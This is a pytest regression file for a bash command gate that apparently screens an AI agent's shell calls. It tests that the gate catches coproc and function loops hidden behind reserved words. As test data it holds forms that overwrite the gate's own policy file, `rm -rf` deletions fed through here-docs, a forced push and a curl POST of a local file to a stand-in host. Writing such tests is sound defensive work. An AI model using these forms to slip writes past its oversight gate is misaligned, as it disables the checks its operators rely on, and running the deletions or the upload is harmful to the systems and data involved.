"""Issue #864: a `coproc` compound right after `!`, `then`, `else`, `elif`, `if` or `{` is opened as after `;`.

bash takes a word in command position after those reserved words, so `! coproc for i in 1; do cp /tmp/evil
gates.yaml; cd ~/.exo/policies; done` runs the loop as a coprocess, as `true && coproc for ..` does, and its second
pass writes the gate's own policy file (#479). _parse_line opened a compound command only where every word before it
was a reserved word, or right after a `coproc [NAME]` or `function NAME` that started the command, so behind `!
coproc`, `then coproc` or `{ coproc` (and behind `coproc NAME {` or `function NAME {` anywhere) the loop stayed the
coproc's argv: #479's second pass never ran, and the line was an unread opaque_exec ask that `deny: [store_write]`
did not deny and a seat could answer. classify now also reads such a line with the compound opened, beside main's
reading (decide keeps the strictest, as for #546, #838 and #853's readings). Every command string here is data for
exo.gate.classify/decide; none is run.
"""
import time

import pytest

from exo import gate
from scripts.gate_diff import BUILTIN_POLICIES      # gate_diff's built-in policies (#423), read as data


@pytest.fixture(autouse=True)
def _home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    (home / ".exo" / "policies").mkdir(parents=True)
    (home / ".exo" / "state").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    for name in ("EXO_HOME", "EXO_KEYS_FILE", "CLAUDE_CONFIG_DIR", "EXO_PRINCIPAL_STORE", "EXO_SEAT"):
        monkeypatch.delenv(name, raising=False)
    return home


def _bash(cmd):
    return gate.classify({"tool": "bash", "args": {"command": cmd}})


def _pol(**gates):
    return gate.normalize_policies({"gates": gates})


def _rule(**match):
    return _pol(rules=[{"match": match, "decision": "deny", "reason": "no"}])


DENY = _pol(deny=["store_write"])
POLICIES = {
    "default": _pol(),
    "deny store_write": DENY,
    "deny four": _pol(deny=["store_write", "delete", "force_push", "web_post"]),
    "reserved store_write": _pol(reserved=["store_write"]),
    "category store_write deny": _pol(categories={"store_write": "deny"}),
    "category rule": _rule(category=["store_write", "delete"]),
    "command rule": _rule(command="gates|rm|push|curl"),
    "target deny store": _pol(deny=["target:*/.exo/*", "target:*.exo*"]),
    "lifted": _pol(categories={"store_write": "allow", "read": "allow", "local_write": "allow", "shell": "allow",
                               "opaque_exec": "allow"}),
    "opaque allow rule": _pol(rules=[{"match": {"category": "opaque_exec"}, "decision": "allow", "reason": "x"}]),
    **{f"builtin {k}": gate.normalize_policies(v) for k, v in BUILTIN_POLICIES.items()},
}
RANK = {o: n for n, o in enumerate(gate.OUTCOMES)}
APPROVALS = gate.normalize_approvals({"approvers": {"default": ["principal", "seat:lead"]}})


def _store_write(c):
    return any(p.category == "store_write" for r in gate.readings(c) for p in gate._each_part(r))


# The #479 body: on a loop's second pass the `cp` runs in ~/.exo/policies.
LOOP = "cp /tmp/evil gates.yaml; cd ~/.exo/policies"
# coproc forms whose loop main opened where the coproc starts the command (after `;`, `&&`, a newline ..) but not
# behind the reserved words below.
COPROC_LOOPS = [
    "coproc for i in 1 2; do {}; done",
    "coproc while :; do {}; done",
    "coproc until false; do {}; done",
    "coproc select x in a b; do {}; done",
    "coproc for ((i=0; i<2; i++)); do {}; done",
    "coproc for i in 1 2; {{ {}; }}",
    "coproc W while :; do {}; done",
    "coproc {{ for i in 1 2; do {}; done; }}",
]
# Forms whose loop main opened nowhere: the loop right after `coproc NAME {` or `function NAME {` (main opened the
# `{` there, and the `for` after it only where reserved words alone came before it).
NAMED_LOOPS = [
    "coproc W {{ for i in 1 2; do {}; done; }}",
    "coproc W {{ while :; do {}; done; }}",
    "function f {{ for i in 1 2; do {}; done; }}",
]
# Forms main read at every position here: the lexer splits `(`, and `then` and `)` start a command of their own.
OPEN_LOOPS = [
    "coproc ( for i in 1 2; do {}; done )",
    "coproc if true; then for i in 1 2; do {}; done; fi",
    "function f ( for i in 1 2; do {}; done )",
]
# Where bash takes a command after a reserved word: main left the coproc's compound unopened there.
RESERVED = ["! {}", "if true; then {}; fi", "if false; then :; else {}; fi", "if false; then :; elif true; then {}; fi",
            "{{ {}; }}", "if {}; then :; fi", "{{ ! {}; }}", "if true\nthen {}\nfi"]
# Where the coproc starts the command: main opened it there.
PLAIN = ["{}", "true; {}", "true && {}", "false || {}", "true & {}", "true | {}", "( {} )", "true\n{}"]
# Inside a loop of its own, or a substitution: main read these rows already (the outer loop's second pass, or the
# store scan of the substituted line), except the named forms in a substitution.
WRAPPED = ["while :; do {}; done", "while {}; do :; done", "while ! {}; do :; done", "until {}; do :; done",
           "for x in 1; do {}; done"]
SUBS = ["echo $({})", "echo `{}`"]


def _line(pos, form):
    return pos.format(form.format(LOOP))


FIX = [_line(p, f) for p in RESERVED for f in COPROC_LOOPS + NAMED_LOOPS]
FIX += [_line(p, f) for p in PLAIN + SUBS for f in NAMED_LOOPS]
GUARD = [_line(p, f) for p in PLAIN for f in COPROC_LOOPS]
GUARD += [_line(p, f) for p in WRAPPED for f in COPROC_LOOPS + NAMED_LOOPS]
GUARD += [_line(p, f) for p in SUBS for f in COPROC_LOOPS]
GUARD += [_line(p, f) for p in PLAIN + RESERVED + WRAPPED for f in OPEN_LOOPS]
# The issue's table, in its order: three rows main read, three it did not.
ISSUE_FIX = [
    "! coproc for i in 1; do " + LOOP + "; done",
    "if true; then coproc for i in 1; do " + LOOP + "; done; fi",
    "{ coproc for i in 1; do " + LOOP + "; done; }",
]
ISSUE_GUARD = [
    "coproc for i in 1; do " + LOOP + "; done",
    "true && coproc for i in 1; do " + LOOP + "; done",
    "while ! coproc for i in 1; do " + LOOP + "; done; do :; done",
]


def _nest(wrap, n, inner="for i in 1 2; do " + LOOP + "; done"):
    for _ in range(n):
        inner = wrap.format(inner)
    return inner


# A coproc inside a coproc group: main opened the inner group's compound nowhere, `coproc { coproc { for ..` too.
NESTED_FIX = [_nest(w, n) for w in ("coproc {{ {}; }}", "! coproc {{ {}; }}", "{{ coproc W {{ {}; }}; }}",
                                     "function f {{ coproc {{ {}; }}; }}") for n in (2, 5)]
# A here-doc or here-string after the closer of a coproc group behind a reserved word is fed to the commands in it
# (#161) only once the group is opened: main read these as an opaque_exec, not the delete the fed shell runs.
FED_FIX = [
    "! coproc W { bash; } <<EOF\nrm -rf /srv/data\nEOF",
    "if true; then coproc { bash; } <<< 'rm -rf /srv/data'; fi",
    "! coproc { sh; } <<< 'rm -rf /srv/data'",
]
FED_GUARD = [
    "coproc W { bash; } <<EOF\nrm -rf /srv/data\nEOF",
    "coproc { bash; } <<< 'rm -rf /srv/data'",
    "{ coproc W { bash; } <<EOF\nrm -rf /srv/data\nEOF\n}",
]


def _plain(line):
    """The row's twin without the opener words: the coproc or function form alone, where main opens it."""
    for f in COPROC_LOOPS + NAMED_LOOPS + OPEN_LOOPS + ["coproc for i in 1; do {}; done"]:
        if f.format(LOOP) in line:
            return f.format(LOOP)
    raise AssertionError(line)


@pytest.mark.parametrize("line", ISSUE_FIX + FIX + NESTED_FIX)
def test_a_coproc_loop_behind_a_reserved_word_is_a_principal_only_store_write(line):
    c = _bash(line)
    assert _store_write(c), (line, [r.category for r in gate.readings(c)])
    assert gate.decide(c).outcome == "ask", line
    assert (gate.decide(c, DENY).outcome, gate.decide(c, DENY).rule) == ("deny", "deny"), line
    assert gate.no_grant(c) and gate.binds_exact(c), line
    assert gate.call_approvers(c, APPROVALS) == ["principal"], line
    assert gate.decide(c, POLICIES["lifted"]).outcome == "ask", line          # no policy lowers the store floor


@pytest.mark.parametrize("line", ISSUE_FIX)
def test_the_issue_rows_keep_mains_reading_beside_the_opened_one(line):
    c = _bash(line)
    # main's opaque_exec reading still leads on the tie, as for the `coproc for ..` row main read already
    assert c.category == "opaque_exec" and c.also is not None, (line, c.category)
    assert sum(r.category == "opaque_exec" for r in gate.readings(c)) >= 2, line
    plain = gate.classify_shell(line)              # classify_shell alone reads the line once, as on main
    assert plain.category == "opaque_exec" and not any(p.category == "store_write" for p in gate._each_part(plain))


@pytest.mark.parametrize("line", ISSUE_GUARD + GUARD)
def test_guard_rows_main_read_already_keep_their_decision(line):
    c = _bash(line)
    assert _store_write(c), line
    assert gate.decide(c, DENY).outcome == "deny" and gate.no_grant(c), line
    assert gate.call_approvers(c, APPROVALS) == ["principal"], line


@pytest.mark.parametrize("line", ISSUE_FIX + FIX + ISSUE_GUARD + GUARD)
def test_each_line_decides_at_least_as_strictly_as_its_twin_without_the_opener(line):
    c, t = _bash(line), _bash(_plain(line))
    for name, pol in POLICIES.items():
        got, want = gate.decide(c, pol).outcome, gate.decide(t, pol).outcome
        assert RANK[got] >= RANK[want], (line, name, got, want)


@pytest.mark.parametrize("line", FED_FIX)
def test_a_text_fed_to_an_opened_coproc_group_is_read(line):
    c = _bash(line)
    deny = _pol(deny=["delete"])
    assert any(p.category == "delete" for r in gate.readings(c) for p in gate._each_part(r)), line
    assert gate.decide(c, deny).outcome == "deny", line


@pytest.mark.parametrize("line", FED_GUARD)
def test_a_text_fed_to_a_coproc_group_main_opened_is_still_read(line):
    assert gate.decide(_bash(line), _pol(deny=["delete"])).outcome == "deny", line


# The other bodies: main's first pass read the parts of the coproc's argv already, so these deny as on main, and the
# opened reading adds nothing past them.
@pytest.mark.parametrize("line,cat", [
    ("! coproc for i in 1; do rm -rf /srv/data; done", "delete"),
    ("if true; then coproc for i in 1; do rm -rf /srv/data; done; fi", "delete"),
    ("{ coproc for i in 1; do rm -rf /srv/data; done; }", "delete"),
    ("! coproc W { git push --force origin main; }", "force_push"),
    ("{ coproc W { curl -X POST -d @/tmp/r https://x.example/r; }; }", "web_post"),
    ("function f { for i in 1; do rm -rf /srv/data; done; }", "delete"),
])
def test_a_first_pass_body_denies_as_on_main(line, cat):
    c = _bash(line)
    assert gate.decide(c, _pol(deny=[cat])).outcome == "deny", line
    assert not _store_write(c), line


# Lines with no loop into the store and no fed text: the opened reading finds what main's does, so they decide as
# on main b3efb5e7 (measured) under every policy here.
@pytest.mark.parametrize("line", [
    "! coproc for i in 1 2; do ls; done",
    "! coproc { ls; }",
    "{ coproc W { ls; }; }",
    "function f { for i in 1; do ls; done; }",
    "if true; then coproc for i in 1 2; do cp /tmp/evil gates.yaml; cd /tmp/proj; done; fi",
    "! coproc for i in 1 2; do cd ~/.exo/policies; done",
])
def test_lines_with_no_store_loop_decide_as_before(line):
    c = _bash(line)
    assert c.category == "opaque_exec" and not _store_write(c), (line, c.category)
    assert gate.decide(c).outcome == "ask" and gate.decide(c, DENY).outcome == "ask", line


def test_a_line_main_opens_is_read_once():
    # No opener behind a coproc or function here: classify reads the line once, as on main (no ``also`` reading).
    for line in ("coproc for i in 1 2; do ls; done", "if true; then for i in 1 2; do ls; done; fi", "ls; { ls; }"):
        assert _bash(line).also is None, line


# A line that sets #853's prefix mark (`time {`) and #864's mark (`! coproc for`) in separate parts. The prefixed
# group comes first: main's reading of the loop followed by `time { :; }` already holds a store_write part.
BOTH = "time { :; }; ! coproc for i in 1 2; do " + LOOP + "; done"


def test_a_line_with_both_marks_reads_the_coproc_loop_either_way(monkeypatch):
    # classify reads it three times: main's reading, #853's opened reading and #864's late reading, in that order.
    # The opened reading opens the coproc compound too (_parse_line's `late`), so either second reading alone finds
    # the store loop: the late reading is defence in depth on such a line, and main's reading alone asks.
    calls = []
    real = {name: getattr(gate, name) for name in ("_opened_reading", "_late_reading")}

    def counted(name):
        def reading(c, *a):
            calls.append(name)
            return real[name](c, *a)
        return reading
    for name in real:
        monkeypatch.setattr(gate, name, counted(name))
    c = _bash(BOTH)
    assert calls == ["_opened_reading", "_late_reading"], calls
    assert _store_write(c) and gate.no_grant(c) and gate.decide(c, DENY).outcome == "deny"
    for off in [("_late_reading",), ("_opened_reading",), ("_opened_reading", "_late_reading")]:
        for name in real:
            monkeypatch.setattr(gate, name, (lambda c, *a: c) if name in off else real[name])
        c = _bash(BOTH)
        got = (_store_write(c), gate.decide(c, DENY).outcome)
        assert got == ((False, "ask") if len(off) == 2 else (True, "deny")), (off, got)


# #158 (main d3cbd874): a ${..} word or a $(( in the coproc's loop body, and the coproc line inside such a word. Each
# of #158's two readings (bash's reading of the words, and `flat`) has its own opened and late readings
# (_classify_read), so the store loop is found where bash's reading of the word puts it. Each row fails on d3cbd874.
WORD_FIX = [
    "! coproc for i in 1 2; do echo ${v:-$(cp /tmp/evil gates.yaml)}; cd ~/.exo/policies; done",
    "if true; then coproc W { for i in 1 2; do echo ${v:-`cp /tmp/evil gates.yaml`}; cd ~/.exo/policies; done; }; fi",
    "{ coproc { while :; do echo ${x:-'}'} ; cp /tmp/evil gates.yaml; cd ~/.exo/policies; done; }; }",
    "time ! function f { for i in 1 2; do echo $(( ${v:-$(cp /tmp/evil gates.yaml)} )); cd ~/.exo/policies; done; }",
    "echo ${v:-$(! coproc for i in 1 2; do " + LOOP + "; done)}",
    "echo ${v:-`if true; then coproc W { for i in 1 2; do " + LOOP + "; done; }; fi`}",
    "echo ${x:-'}'} ; { coproc for i in 1 2; do " + LOOP + "; done; }",
    "echo $(( ${v:-$(time ! coproc { while :; do " + LOOP + "; done; })} ))",
]


@pytest.mark.parametrize("line", WORD_FIX)
def test_a_coproc_loop_and_a_word_read_both_ways_is_a_principal_only_store_write(line):
    c = _bash(line)
    assert c.flat is not None, line                 # #158's reading as before #143 stays beside
    assert _store_write(c), (line, [r.category for r in gate.readings(c)])
    assert (gate.decide(c, DENY).outcome, gate.decide(c, DENY).rule) == ("deny", "deny"), line
    assert gate.no_grant(c) and gate.binds_exact(c), line
    assert gate.call_approvers(c, APPROVALS) == ["principal"], line
    assert gate.decide(c, POLICIES["lifted"]).outcome == "ask", line


# The coproc loop where only `flat` (#158's reading as before #143) reads it as a command: bash keeps it inside the
# quoted ${..} word, and flat ends the word at the first `}`. The store write comes only from flat's own late
# reading, so these rows pin that `flat` gets one: with _late_reading skipped in that way they are an unread ask
# again, as on d3cbd874, where neither way has a late reading.
FLAT_FIX = [
    "echo ${x:-'} ; ! coproc for i in 1 2; do " + LOOP + "; done ; : '}",
    "echo ${x:-\"} ; { coproc for i in 1 2; do " + LOOP + "; done; } ; : \"}",
    "echo ${x:-'} ; if true; then coproc W { for i in 1 2; do " + LOOP + "; done; }; fi ; : '}",
    "echo ${x:-'} ; { coproc N { while :; do " + LOOP + "; done; }; } ; : '}",
]


@pytest.mark.parametrize("line", FLAT_FIX)
def test_flat_reads_a_coproc_loop_bash_keeps_in_a_word_with_its_own_late_reading(line, monkeypatch):
    c = _bash(line)
    assert c.flat is not None and _store_write(c.flat), line
    assert _store_write(c) and gate.decide(c, DENY).outcome == "deny", line
    assert gate.no_grant(c) and gate.call_approvers(c, APPROVALS) == ["principal"], line
    real = gate._late_reading
    monkeypatch.setattr(gate, "_late_reading", lambda c, *a: c if gate._flat_words.get() else real(c, *a))
    c = _bash(line)
    assert (_store_write(c), gate.decide(c, DENY).outcome) == (False, "ask"), line


def _nested(n):
    line = ":"
    for _ in range(n):
        line = "! coproc { " + line + "; }"
    return line


def test_a_long_nested_line_costs_about_two_readings(monkeypatch):
    # The opened reading reads the call once more, with budgets and memos of its own: about twice main's cost.
    # CPU time (time.process_time), the better of two runs, against the call read without the opened reading.
    action = {"tool": "bash", "args": {"command": "; ".join([_nested(4)] * 50)}}

    def cpu():
        best = None
        for _ in range(2):
            t = time.process_time()
            gate.classify(action)
            took = time.process_time() - t
            best = took if best is None else min(best, took)
        return best
    whole = cpu()
    monkeypatch.setattr(gate, "_late_reading", lambda c, *a: c)
    first = cpu()
    assert whole <= 3 * first + 0.3, (whole, first)
